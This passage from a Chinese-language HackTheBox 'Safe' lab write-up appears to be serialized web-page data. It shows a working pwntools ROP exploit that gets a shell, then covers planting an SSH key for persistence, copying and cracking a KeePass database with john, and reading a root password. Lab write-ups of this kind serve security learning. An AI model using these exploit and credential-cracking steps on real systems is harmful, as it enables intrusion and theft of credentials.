_fini\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"有\",[\"$\",\"code\",null,{\"children\":\"system\"}],\"，\",[\"$\",\"code\",null,{\"children\":\"gets\"}],\"方法，所以可以调用通过gets方法读取\",[\"$\",\"code\",null,{\"children\":\"/bin/sh\"}],\"，然后通过system调用。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"通过使用ida反编译的时候可以看到程序的\",[\"$\",\"code\",null,{\"children\":\".data\"}],\"段是可写的，并且获取到地址为\",[\"$\",\"code\",null,{\"children\":\"0x404038h\"}],\"。所以我们可以通过调用\",[\"$\",\"code\",null,{\"children\":\"gets\"}],\"函数将\",[\"$\",\"code\",null,{\"children\":\"/bin/sh\"}],\"写入到\",[\"$\",\"code\",null,{\"children\":\"0x404038h\"}],\"中，然用调用\",[\"$\",\"code\",null,{\"children\":\"system(0x404038h)\"}],\"即可。另外我们还需要一个跳转到\",[\"$\",\"code\",null,{\"children\":\"gets\"}],\"函数的gadgets。\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"使用\",[\"$\",\"a\",null,{\"href\":\"https://github.com/JonathanSalwan/ROPgadget\",\"children\":\"ROPgadget\"}],\"可以很方便地找到这个Gadgets：\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali:htb/safe \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# ROPgadget --binary myapp --only \\\"pop|ret\\\" | grep rdi\"}],\"\\n0x000000000040120b : pop rdi ; ret\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"按照这个思路写的exp：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-python\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"from\"}],\" pwn \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"import\"}],\" *\\n\\ncontext(os=\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"linux\\\"\"}],\", arch=\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"amd64\\\"\"}],\")\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"#context(log_level='DEBUG')\"}],\"\\n\\njunk = \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"A\\\"\"}],\"*\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"120\"}],\"\\n\\nplt_gets = p64(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0x401060\"}],\")\\nplt_system = p64(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0x401040\"}],\")\\npop_rdi = p64(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0x40120b\"}],\")\\nbinsh = p64(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0x404038\"}],\")\\n\\npayload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system\\n\\np = remote(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"10.10.10.147\\\"\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1337\"}],\")\\np.recvline()\\np.sendline(payload)\\np.sendline(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'/bin/sh\\\\x00'\"}],\")\\np.interactive()\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"这里Gadgets并不是唯一的，当可利用的Gadgets很多时，getshell的方法也不止一种，这里国外一个叫大佬写了几种其他的方法：\",[\"$\",\"a\",null,{\"href\":\"https://0xdf.gitlab.io/2019/10/26/htb-safe.html\",\"children\":\"https://0xdf.gitlab.io/2019/10/26/htb-safe.html\"}]]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali:htb/safe \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# python exp1.py\"}],\"\\n[+] Opening connection to 10.10.10.147 on port 1337: Done\\n[*] Switching to interactive mode\\n$ \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"whoami\"}],\"\\nuser\\n\"]}]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"提权\",\"children\":\"提权\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"刚刚翻看服务器的时候看到家目录下有几张图片和\",[\"$\",\"code\",null,{\"children\":\"MyPasswords.kdbx\"}],\"（这个不就是我因为记不住密码用的密码管理器，最后因为记不住密码管理器的密码导致所有密码都丢了的KeePass吗）\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"$$ \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\nIMG_0545.JPG\\nIMG_0546.JPG\\nIMG_0547.JPG\\nIMG_0548.JPG\\nIMG_0552.JPG\\nIMG_0553.JPG\\nmyapp\\nMyPasswords.kdbx\\nuser.txt\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"有好几张图片，有个kdbx数据库，这个意思就蛮明显的了吧：kdbx是通过密码+图片来保护的。通过刚刚的方法获得shell之后，因为这台机子还开了22端口，所以可以将自己的公钥复制进来，就可以通过ssh连接了，然后下载文件下来进行爆破。\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali:htb/safe \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# cat ~/.ssh/id_rsa.pub | base64 -w0\"}],\"\\nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略)\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"$$ \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"echo\"}],\" c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略) | \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"base64\"}],\" -d \u003e\u003e /home/user/.ssh/authorized_keys\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* .\"}],\"\\nIMG_0545.JPG                                                       100% 1863KB 944.7KB/s   00:01    \\nIMG_0546.JPG                                                       100% 1872KB   1.6MB/s   00:01    \\nIMG_0547.JPG                                                       100% 2470KB   2.0MB/s   00:01    \\nIMG_0548.JPG                                                       100% 2858KB   1.5MB/s   00:01    \\nIMG_0552.JPG                                                       100% 1099KB   1.6MB/s   00:00    \\nIMG_0553.JPG                                                       100% 1060KB   2.3MB/s   00:00    \\nroot@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx .\"}],\"\\nMyPasswords.kdbx                                                   100% 2446\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"使用keepass2john来生成hash文件：\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# keepass2john MyPasswords.kdbx \u003e MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done \u003e\u003e MyPasswords.kdbx.john\"}],\"\\n\\nroot@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# cat MyPasswords.kdbx.john \"}],\"\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794\\nMyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"做过几台htb的机子后感觉这里的爆破都用\",[\"$\",\"code\",null,{\"children\":\"rockyou.txt\"}],\"字典都能跑出来（不过rockyou.txt有点大，先从小的试起），使用\",[\"$\",\"code\",null,{\"children\":\"john\"}],\"来爆破：\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt \"}],\"\\nWarning: only loading hashes of \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"KeePass\\\"\"}],\", but also saw \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"tripcode\\\"\"}],\"\\nUse the \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"--format=tripcode\\\"\"}],\" option to force loading hashes of that \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" instead\\nWarning: only loading hashes of \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"KeePass\\\"\"}],\", but also saw \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"descrypt\\\"\"}],\"\\nUse the \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"--format=descrypt\\\"\"}],\" option to force loading hashes of that \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"type\"}],\" instead\\nUsing default input encoding: UTF-8\\nLoaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])\\nCost 1 (iteration count) is 60000 \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" all loaded hashes\\nCost 2 (version) is 2 \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" all loaded hashes\\nCost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" all loaded hashes\\nWill run 3 OpenMP threads\\nPress \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'q'\"}],\" or Ctrl-C to abort, almost any other key \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" status\\nbullshit         (MyPasswords)\\n1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco\\nUse the \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"--show\\\"\"}],\" option to display all of the cracked passwords reliably\\nSession aborted\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"拿到密码后打开密码管理器看看\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"root@kali\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx\"}],\"\\nPlease provide the master password: *************************\\n\\nKeePass CLI (kpcli) v3.1 is ready \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" operation.\\nType \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'help'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" a description of available commands.\\nType \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'help \u003ccommand\u003e'\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" details on individual commands.\\n\\nkpcli:/\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n=== Groups ===\\nMyPasswords/\\nkpcli:/\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"cd\"}],\" MyPasswords/\\nkpcli:/MyPasswords\u003e \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"ls\"}],\"\\n=== Groups ===\\neMail/\\nGeneral/\\nHomebanking/\\nInternet/\\nNetwork/\\nRecycle Bin/\\nWindows/\\n=== Entries ===\\n0. Root password\\nkpcli:/MyPasswords\u003e show -f R\\nRecycle\\\\ Bin/   Root\\\\ password\\nkpcli:/MyPasswords\u003e show -f Root\\\\ password\\n\\n Path: /MyPasswords/\\nTitle: Root password\\nUname: root\\n Pass: u3v2249dl9ptv465cogl3cnpo3fyhk\\n  URL:\\nNotes:\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"使用\",[\"$\",\"code\",null,{\"children\":\"su -\"}],\"命令提权：\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"user@safe:~$ su -\\nPassword:\\nroot@safe:~\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"# cat root.txt\"}],\"\\nd7af235eb1.....\\n\"]}]}]]}]]}]]\n"])</script><script>self.__next_f.push([1,"5:[[[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}],[\"$\",\"title\",null,{\"children\":\"HTB safe Writeup\"}],null,null,null,null,null,null,null,null,null,[\"$\",\"meta\",null,{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],null,null,null,null,null,null,null,null,null,null,[]],[null,null,null,null],null,null,[null,null,null,null,null],null,null,null,null,[null,[[\"$\",\"link\",null,{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"any\"}]],[],null]]\n"])</script>